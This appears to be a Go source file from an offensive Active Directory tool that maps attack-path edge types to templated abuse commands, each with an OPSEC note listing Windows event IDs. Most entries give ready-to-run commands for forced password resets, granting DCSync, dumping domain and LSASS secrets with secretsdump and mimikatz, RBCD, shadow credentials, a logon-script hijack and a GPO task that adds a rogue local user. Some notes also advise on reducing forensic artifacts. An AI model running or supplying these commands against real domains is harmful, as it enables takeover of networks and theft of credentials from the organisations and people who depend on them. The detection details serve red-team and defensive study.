package abuse

import "github.com/krazybeastx1/omenhound/pkg/model"

// Template is the static half of a dynamic abuse command: a command string with
// placeholders that the renderer interpolates from live graph node properties,
// plus an OPSEC note describing the technique's detection footprint.
type Template struct {
	Edge         model.EdgeKind
	Summary      string
	Read         string
	Command      string
	Alternates   []string
	OPSEC        string
	EventIDs     []int
	RequiresAuth string
}

// Placeholders supported in Command/Alternates. The renderer fills any that are
// not present in the graph with "<unknown>".
//
//	{DOMAIN} {DC} {SOURCE_SAM} {SOURCE_DN} {SOURCE_SID} {SOURCE_NAME}
//	{TARGET_SAM} {TARGET_DN} {TARGET_SID} {TARGET_NAME}
const (
	phDomain     = "{DOMAIN}"
	phDC         = "{DC}"
	phSourceSAM  = "{SOURCE_SAM}"
	phSourceDN   = "{SOURCE_DN}"
	phSourceSID  = "{SOURCE_SID}"
	phSourceName = "{SOURCE_NAME}"
	phTargetSAM  = "{TARGET_SAM}"
	phTargetDN   = "{TARGET_DN}"
	phTargetSID  = "{TARGET_SID}"
	phTargetName = "{TARGET_NAME}"
)

// Templates is the reference map of edge -> abuse guidance. It starts from the
// BloodHound CE open-source edge/abuse-info metadata and is extended here with
// OPSEC/detection detail.
var Templates = map[model.EdgeKind]Template{
	model.EdgeGenericAll: {
		Edge:    model.EdgeGenericAll,
		Summary: "Full control over the target object — equivalent to the rights the object type permits.",
		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set password {TARGET_SAM} 'NewPassw0rd!42'",
		Alternates: []string{
			"impacket-dacledit -action write -rights FullControl -principal {SOURCE_SAM} -target {TARGET_SAM} '{DOMAIN}/{SOURCE_SAM}:<password>'",
			"# Computer target: RBCD / shadow creds via certipy or bloodyAD add rbcd",
			"certipy shadow auto -username {SOURCE_SAM}@{DOMAIN} -password '<password>' -account {TARGET_SAM}",
		},
		OPSEC:        "Password reset on a user hits unicodePwd over LDAPS (event 4724 on the target DC). On a computer object, RBCD writes msDS-AllowedToActOnBehalfOfOtherIdentity (5136). Both are loud — correlate with the operator's source IP.",
		EventIDs:     []int{4724, 4738, 5136},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeGenericWrite: {
		Edge:    model.EdgeGenericWrite,
		Summary: "Write properties of the target (e.g. scriptPath, altSecurityIdentities, RBCD) without full control.",
		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_SAM} altSecurityIdentities 'X509:<I>...<S>...'",
		Alternates: []string{
			"# scriptPath logon-script hijack (user target)",
			"bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_SAM} scriptPath '\\\\{DOMAIN}\\netlogon\\evil.bat'",
			"# RBCD against a computer target: add rbcd / set rbcd",
			"bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add rbcd {TARGET_SAM} <ATTACKER_SAM>",
		},
		OPSEC:        "Property writes land as 5136 directory-service-change events. scriptPath writes are caught by logon-script monitoring; RBCD by msDS-AllowedToActOnBehalfOfOtherIdentity change auditing.",
		EventIDs:     []int{5136},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeWriteDacl: {
		Edge:    model.EdgeWriteDacl,
		Summary: "Grant yourself additional rights (e.g. DCSync, GenericAll) on the target by editing its DACL.",
		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add genericAll {TARGET_DN} {SOURCE_SAM}",
		Alternates: []string{
			"# Grant DCSync",
			"bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add dcsync {SOURCE_SAM}",
			"impacket-dacledit -action write -rights DCSync -principal {SOURCE_SAM} -target-dn '{TARGET_DN}' '{DOMAIN}/{SOURCE_SAM}:<password>'",
		},
		OPSEC:        "DACL edits are 5136 events on the target object; the DACL diff is visible in Sysmon/DS Access auditing. Granting DCSync is one of the highest-signal changes an AD monitoring stack watches for.",
		EventIDs:     []int{5136, 4662},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeWriteOwner: {
		Edge:    model.EdgeWriteOwner,
		Summary: "Take ownership of the target, then rewrite its DACL to gain full control.",
		Read:    "impacket-owneredit -action read -target {TARGET_SAM} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "impacket-owneredit -action write -new-owner '{SOURCE_SAM}' -target '{TARGET_SAM}' '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Alternates: []string{
			"bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set owner {TARGET_DN} {SOURCE_SAM}",
		},
		OPSEC:        "Ownership change is a 5136 event (nTSecurityDescriptor) on the target; subsequent DACL rewrite is another. Chains of WriteOwner -> WriteDacl are common and easy to spot in sequence.",
		EventIDs:     []int{5136},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeForceChangePassword: {
		Edge:    model.EdgeForceChangePassword,
		Summary: "Reset the target user's password without knowing the current one.",
		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set password {TARGET_SAM} 'NewPassw0rd!42'",
		Alternates: []string{
			"rpcclient -U '{DOMAIN}/{SOURCE_SAM}%<password>' {DC} -c \"setuserinfo2 {TARGET_SAM} 23 'NewPassw0rd!42'\"",
		},
		OPSEC:        "bloodyAD uses unicodePwd over LDAPS (4724); rpcclient uses SamrChangePasswordUser over RPC, which produces 4738 and may avoid LDAPS-only logging but is RPC-noisy.",
		EventIDs:     []int{4724, 4738},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeAddMember: {
		Edge:    model.EdgeAddMember,
		Summary: "Add a principal to the target group (e.g. Domain Admins).",
		Read:    "net rpc group members '{TARGET_SAM}' -U '{DOMAIN}/{SOURCE_SAM}%<password>' -S {DC}",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add groupMember '{TARGET_SAM}' {SOURCE_SAM}",
		Alternates: []string{
			"net rpc group addmem \"{TARGET_SAM}\" \"{SOURCE_SAM}\" /add /domain",
		},
		OPSEC:        "Group membership changes are 4728/4732 (security-enabled global/local group member added) and 4756 (universal). Adding to a privileged group is high-signal.",
		EventIDs:     []int{4728, 4732, 4756},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeAddSelf: {
		Edge:    model.EdgeAddSelf,
		Summary: "Add yourself to the target group.",
		Read:    "net rpc group members '{TARGET_SAM}' -U '{DOMAIN}/{SOURCE_SAM}%<password>' -S {DC}",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add groupMember '{TARGET_SAM}' {SOURCE_SAM}",
		Alternates: []string{
			"Add-DomainGroupMember -Identity '{TARGET_SAM}' -Members '{SOURCE_SAM}'",
		},
		OPSEC:        "Same 4728/4732/4756 membership events. Because the actor is the group's own grantee, the actor and target overlap — still logged.",
		EventIDs:     []int{4728, 4732, 4756},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeOwns: {
		Edge:         model.EdgeOwns,
		Summary:      "Source owns the target and may rewrite its DACL for full control.",
		Read:         "impacket-owneredit -action read -target {TARGET_SAM} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command:      "impacket-dacledit -action write -rights FullControl -principal {SOURCE_SAM} -target '{TARGET_SAM}' '{DOMAIN}/{SOURCE_SAM}:<password>'",
		OPSEC:        "DACL/owner modifications are 5136 events on the target object.",
		EventIDs:     []int{5136},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeAllowedToDelegate: {
		Edge:    model.EdgeAllowedToDelegate,
		Summary: "Constrained delegation: source can impersonate any user to the listed services via S4U2Self/S4U2Proxy.",
		Read:    "impacket-findDelegation -user '{SOURCE_SAM}' -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "impacket-getST -spn <SPN> -impersonate Administrator '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Alternates: []string{
			"# With protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION), S4U2Self needs no user interaction.",
			"Rubeus s4u /user:{SOURCE_SAM} /rc4:<hash> /impersonateuser:Administrator /msdsspn:<SPN> /ptt",
		},
		OPSEC:        "S4U2Self/S4U2Proxy generate 4769 (Kerberos service ticket) with unusual Transited Services / S4U flags. Detect via 4769 with Ticket Options 0x40810000.",
		EventIDs:     []int{4769},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeAllowedToAct: {
		Edge:    model.EdgeAllowedToAct,
		Summary: "Resource-Based Constrained Delegation: source may impersonate users to the target via S4U2Self.",
		Read:    "impacket-rbcd -delegate-to {TARGET_SAM} -action read -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "impacket-getST -spn cifs/{TARGET_NAME}.{DOMAIN} -impersonate Administrator -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Alternates: []string{
			"Rubeus s4u /user:{SOURCE_SAM} /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{TARGET_NAME}.{DOMAIN} /ptt",
		},
		OPSEC:        "RBCD writes msDS-AllowedToActOnBehalfOfOtherIdentity on the target (5136) and produces 4769 S4U tickets. Watch both the property write and the ticket.",
		EventIDs:     []int{5136, 4769},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeAdminTo: {
		Edge:    model.EdgeAdminTo,
		Summary: "Source has local admin on the target host.",
		Read:    "nxc smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
		Command: "netexec smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>' -x whoami",
		Alternates: []string{
			"impacket-psexec {DOMAIN}/{SOURCE_SAM}:<password>@{TARGET_NAME}.{DOMAIN}",
			"impacket-wmiexec {DOMAIN}/{SOURCE_SAM}:<password>@{TARGET_NAME}.{DOMAIN}",
		},
		OPSEC:        "Remote execution via SMB (PsExec: 7045 service + 4624 type 3) or WMI (no service, but 4688 process creation on target if audited). Prefer WMI/atexec over PsExec to reduce artifacts.",
		EventIDs:     []int{7045, 4624, 4688},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeCanPSRemote: {
		Edge:    model.EdgeCanPSRemote,
		Summary: "Source may open a PowerShell Remoting (WinRM) session to the target.",
		Read:    "nxc winrm {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
		Command: "netexec winrm {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>' -x whoami",
		Alternates: []string{
			"evil-winrm -i {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
		},
		OPSEC:        "WinRM logons are 5985/5986 network traffic and 4624 type 3 on the target; PowerShell operational logging (4103/4104) may capture commands.",
		EventIDs:     []int{4624, 4103, 4104},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeExecuteDCOM: {
		Edge:         model.EdgeExecuteDCOM,
		Summary:      "Source can execute COM objects remotely on the target.",
		Read:         "nxc smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
		Command:      "impacket-dcomexec {DOMAIN}/{SOURCE_SAM}:<password>@{TARGET_NAME}.{DOMAIN} 'cmd /c whoami'",
		OPSEC:        "DCOM execution creates a process on the target (4688 if audited) and leaves DCOM/RPC network artifacts (port 135 + dynamic RPC). Less service-level footprint than PsExec.",
		EventIDs:     []int{4688},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeHasSession: {
		Edge:    model.EdgeHasSession,
		Summary: "Source user has an active logon session on the target computer (their credentials are cached in memory).",
		Read:    "nxc smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>' --loggedon-users",
		Command: "netexec smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>' --lsa",
		Alternates: []string{
			"# Dump LSASS with a privileged context, then hunt {SOURCE_SAM}'s ticket/hash",
			"impacket-secretsdump -just-dc-user {SOURCE_SAM} '{DOMAIN}/<admin>:<password>@{TARGET_NAME}.{DOMAIN}'",
		},
		OPSEC:        "HasSession itself is telemetry, not an action. Acting on it (LSASS access) triggers 4656/4663 and, with PPL/Sysmon, Credential Guard alerts. High risk of detection.",
		EventIDs:     []int{4656, 4663},
		RequiresAuth: "Type 1 (relationship): generally requires privileged access to the target host.",
	},
	model.EdgeMemberOf: {
		Edge:         model.EdgeMemberOf,
		Summary:      "Source is a member of the target group; inherits its rights.",
		Read:         "net rpc group members '{TARGET_SAM}' -U '{DOMAIN}/{SOURCE_SAM}%<password>' -S {DC}",
		Command:      "# {SOURCE_SAM} is a member of {TARGET_SAM} — enumerate its transitive privileges, no action needed here.",
		OPSEC:        "Structural edge. No direct event; used to chain group-derived privilege.",
		RequiresAuth: "Structural (no action).",
	},
	model.EdgeDCSync: {
		Edge:    model.EdgeDCSync,
		Summary: "Source can replicate directory secrets (DS-Replication-Get-Changes-All) — domain-wide credential theft.",
		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc",
		Alternates: []string{
			"mimikatz '# ' 'lsadump::dcsync /domain:{DOMAIN} /all /csv'",
		},
		OPSEC:        "DCSync requires a DRSUAPI replication request from a non-DC. Event 4662 (DS access) with the replication GUID, or 4624 type 3 from a workstation to a DC for DRSUAPI. Extremely high-signal — almost always alerted.",
		EventIDs:     []int{4662, 4624},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeGetChanges: {
		Edge:         model.EdgeGetChanges,
		Summary:      "Source has DS-Replication-Get-Changes (partial replication read).",
		Read:         "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command:      "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc",
		OPSEC:        "Half of the DCSync right. 4662 events with the replication GUID.",
		EventIDs:     []int{4662},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeGetChangesAll: {
		Edge:         model.EdgeGetChangesAll,
		Summary:      "Source has DS-Replication-Get-Changes-All; combined with GetChanges enables DCSync.",
		Read:         "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command:      "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc",
		OPSEC:        "Half of the DCSync right. 4662 events with the replication GUID.",
		EventIDs:     []int{4662},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeReadLAPSPassword: {
		Edge:    model.EdgeReadLAPSPassword,
		Summary: "Source can read the target computer's local administrator password from LAPS.",
		Read:    "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --module laps",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get search --base '{TARGET_DN}' --filter '(objectClass=computer)' --attr ms-Mcs-AdmPwd,msLAPS-Password",
		Alternates: []string{
			"netexec ldap {DC} -u {SOURCE_SAM} -p '<password>' --laps",
		},
		OPSEC:        "LDAP reads of ms-Mcs-AdmPwd/msLAPS-Password are logged (4662 for the attribute, or LDAP query auditing). Windows LAPS audit: 4662 with the password attribute GUID.",
		EventIDs:     []int{4662},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeReadGMSAPassword: {
		Edge:    model.EdgeReadGMSAPassword,
		Summary: "Source can read a Group Managed Service Account's password blob via msDS-ManagedPassword.",
		Read:    "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --gmsa",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get search --base '{TARGET_DN}' --filter '(objectClass=msDS-Group-Managed-Service-Account)' --attr msDS-ManagedPassword",
		Alternates: []string{
			"gMSADumper.py -u {SOURCE_SAM} -p '<password>' -d {DOMAIN}",
		},
		OPSEC:        "Reads msDS-ManagedPassword over LDAP; audited as 4662 for the attribute.",
		EventIDs:     []int{4662},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeContains: {
		Edge:         model.EdgeContains,
		Summary:      "Structural containment (OU/container holds the object).",
		Read:         "ldapsearch -H ldap://{DC} -x -D '{SOURCE_SAM}@{DOMAIN}' -w '<password>' -b '{SOURCE_DN}' -s one '(objectClass=*)' distinguishedName",
		Command:      "# Structural edge: {TARGET_NAME} is contained by {SOURCE_DN}. No action.",
		OPSEC:        "Structural. No event.",
		RequiresAuth: "Structural (no action).",
	},
	model.EdgeGPLink: {
		Edge:    model.EdgeGPLink,
		Summary: "Source GPO is linked at the target container (domain/OU/site); its settings apply to everything the container holds (Enforced flag shown on the edge).",
		Read:    "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get object {TARGET_DN} --attr gPLink",
		Command: "# GPO {SOURCE_NAME} ({SOURCE_DN}) is linked at {TARGET_DN}. To abuse: gain write on the GPO, inject an immediate scheduled task, wait for policy refresh.",
		Alternates: []string{
			"# SharpGPOAbuse.exe --AddComputerTask --TaskName 'evil' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net user hacker P@ss /add' --GPOName '{SOURCE_NAME}'",
		},
		OPSEC:        "GPO edits are 5136/5137 on the GPO object; the payload lands on clients at gpupdate (~90 min) and executes via 4688/7045 on many hosts at once — very loud.",
		EventIDs:     []int{5136, 5137, 4688},
		RequiresAuth: "Type 1 (relationship): requires GPO write on {SOURCE_NAME}.",
	},
	model.EdgeTrustedBy: {
		Edge:         model.EdgeTrustedBy,
		Summary:      "Source domain is trusted by the target domain; SSID/SID-history abuse may allow cross-domain escalation.",
		Read:         "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --query '(objectClass=trustedDomain)' 'trustPartner trustDirection trustAttributes'",
		Command:      "# Cross-domain trust {SOURCE_DN} -> {TARGET_DN}. Enumerate trust direction/transitivity and SID filtering.",
		OPSEC:        "Trust changes are rare; 4706/4707 are logged if trust manipulation occurs.",
		EventIDs:     []int{4706, 4707},
		RequiresAuth: "Structural/trust (no direct action).",
	},
	model.EdgeCanRDP: {
		Edge:    model.EdgeCanRDP,
		Summary: "Source may open a Remote Desktop session to the target host.",
		Read:    "nxc rdp {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
		Command: "xfreerdp /v:{TARGET_NAME}.{DOMAIN} /u:{SOURCE_SAM} /p:'<password>' /cert:ignore",
		Alternates: []string{
			"rdesktop -u {SOURCE_SAM} {TARGET_NAME}.{DOMAIN}",
		},
		OPSEC:        "RDP network logons are 4624 type 10 (or 3 via RD Gateway). RDP service must be reachable; negotiate NLA to avoid plaintext.",
		EventIDs:     []int{4624},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeAllExtendedRights: {
		Edge:    model.EdgeAllExtendedRights,
		Summary: "Source holds all extended rights on the target (includes ForceChangePassword, AddMember, DCSync when on a domain).",
		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set password {TARGET_SAM} 'NewPassw0rd!42'",
		Alternates: []string{
			"# On a Domain object, AllExtendedRights includes DS-Replication rights:",
			"impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc",
		},
		OPSEC:        "Treat like the union of its implied rights — password writes (4724) or replication (4662) land depending on target type.",
		EventIDs:     []int{4724, 4662},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeAddKeyCredentialLink: {
		Edge:    model.EdgeAddKeyCredentialLink,
		Summary: "Source can write msDS-KeyCredentialLink on the target — Shadow Credentials / device credential persistence.",
		Read:    "certipy-ad shadow list -username {SOURCE_SAM}@{DOMAIN} -password '<password>' -account {TARGET_SAM} -dc-ip {DC}",
		Command: "certipy shadow auto -username {SOURCE_SAM}@{DOMAIN} -password '<password>' -account {TARGET_SAM}",
		Alternates: []string{
			"# From Windows: pywhisker / Whisker.exe add_user_fake --domain {DOMAIN} --user {TARGET_SAM} --password <KEYPAIR_PW>",
		},
		OPSEC:        "msDS-KeyCredentialLink write is a 5136 event; PKINIT then authenticates the account and yields Kerberos 4768/4769 AS-REQ activity with an unusual key.",
		EventIDs:     []int{5136, 4768},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeAddAllowedToAct: {
		Edge:    model.EdgeAddAllowedToAct,
		Summary: "Source can set the target computer's AllowedToAct list (RBCD on this computer).",
		Read:    "impacket-rbcd -delegate-to {TARGET_SAM} -action read -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add rbcd {TARGET_NAME} <ATTACKER_SAM>",
		Alternates: []string{
			"impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Passw0rd' -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		},
		OPSEC:        "Writes msDS-AllowedToActOnBehalfOfOtherIdentity (5136) on the target; then S4U2Self/S4U2Proxy tickets (4769 with S4U flags).",
		EventIDs:     []int{5136, 4769},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeWriteSPN: {
		Edge:    model.EdgeWriteSPN,
		Summary: "Source can modify the target's servicePrincipalName — Kerberoast-on-the-fly / targeted Kerberoasting.",
		Read:    "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get object {TARGET_SAM} --attr servicePrincipalName",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_SAM} servicePrincipalName 'http/EVIL'",
		Alternates: []string{
			"# Request a TGS for the planted SPN, then crack:",
			"impacket-GetUserSPNs '{DOMAIN}/{SOURCE_SAM}:<password>' -request",
		},
		OPSEC:        "SPN write is a 5136 event; subsequent TGS request is 4769 with a service ticket for the planted SPN. Watch new SPN values appearing on non-service accounts.",
		EventIDs:     []int{5136, 4769},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeWriteAccountRestrictions: {
		Edge:    model.EdgeWriteAccountRestrictions,
		Summary: "Source can modify the target's account restrictions (userAccountControl / msDS-AllowedToActOnBehalfOfOtherIdentity).",
		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set uac {TARGET_SAM} TRUSTED_TO_AUTH_FOR_DELEGATION",
		Alternates: []string{
			"# Or set RBCD delegation as with AddAllowedToAct:",
			"bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add rbcd {TARGET_SAM} <ATTACKER_SAM>",
		},
		OPSEC:        "userAccountControl / restriction writes are 5136 events; enabling unprotected delegation flags is high-signal when audited.",
		EventIDs:     []int{5136},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeWriteGPLink: {
		Edge:    model.EdgeWriteGPLink,
		Summary: "Source can modify the gPLink attribute of the target container — link a hostile GPO without touching its content.",
		Read:    "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get object {TARGET_DN} --attr gPLink",
		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_DN} gPLink '[LDAP://CN=<GPO>,CN=Policies,CN=System,DC={DOMAIN};0]'",
		Alternates: []string{
			"# OUned.py --add-link (requires GPO write too) — see 'OU having a laugh??'",
		},
		OPSEC:        "gPLink attribute changes are 5136 events on the target container; the linked GPO then applies to all contained objects.",
		EventIDs:     []int{5136},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeGetChangesInFilteredSet: {
		Edge:         model.EdgeGetChangesInFilteredSet,
		Summary:      "Source has DS-Replication-Get-Changes-In-Filtered-Set — can plant/hide SID history in a filtered domain partition.",
		Read:         "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
		Command:      "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc-user Administrator",
		OPSEC:        "Replication-DS access is logged as 4662 with the filtered-set replication GUID.",
		EventIDs:     []int{4662},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
	},
	model.EdgeWriteAltSecurityIdentities: {
		Edge:         model.EdgeWriteAltSecurityIdentities,
		Summary:      "Source can write altSecurityIdentities on the target — bind a certificate to the account (kerberos/ms-ts issued certs).",
		Read:         "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get object {TARGET_SAM} --attr altSecurityIdentities",
		Command:      "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_SAM} altSecurityIdentities 'X509:<I>...<S>...'",
		OPSEC:        "altSecurityIdentities write is a 5136 event; the subsequent certificate-based logon produces 4624 + certificate hash, coinciding with domain controller 4768.",
		EventIDs:     []int{5136, 4768},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
	model.EdgeDumpSMSAPassword: {
		Edge:         model.EdgeDumpSMSAPassword,
		Summary:      "Source can read the target Managed Service Account's current password blob.",
		Read:         "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --gmsa",
		Command:      "gMSADumper.py -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -l {DC}",
		OPSEC:        "msDS-ManagedPassword reads are 4662 attribute-read events against the gMSA.",
		EventIDs:     []int{4662},
		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
	},
}

// Lookup returns the template for an edge kind.
func Lookup(k model.EdgeKind) (Template, bool) {
	t, ok := Templates[k]
	return t, ok
}

// Supported returns the edge kinds that have abuse templates.
func Supported() []model.EdgeKind {
	out := make([]model.EdgeKind, 0, len(Templates))
	for k := range Templates {
		out = append(out, k)
	}
	return out
}
